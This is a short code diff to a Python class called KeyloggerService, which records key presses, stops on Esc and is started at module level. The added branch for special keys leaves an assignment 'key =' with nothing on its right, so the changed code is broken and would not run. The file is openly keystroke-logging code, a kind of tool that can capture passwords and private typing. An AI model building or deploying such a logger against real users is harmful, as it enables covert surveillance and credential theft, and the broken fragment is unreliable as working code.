@@ -20,7 +20,9 @@ class KeyloggerService(IKeyLogger):
     def press(self,key):
         if key == Key.esc:
             self.stop_logging()
-        self.presses.append(key)
+        elif key in special_keys:
+            key =
+            self.presses.append(key)
 
 x = KeyloggerService()
 x.start_logging()
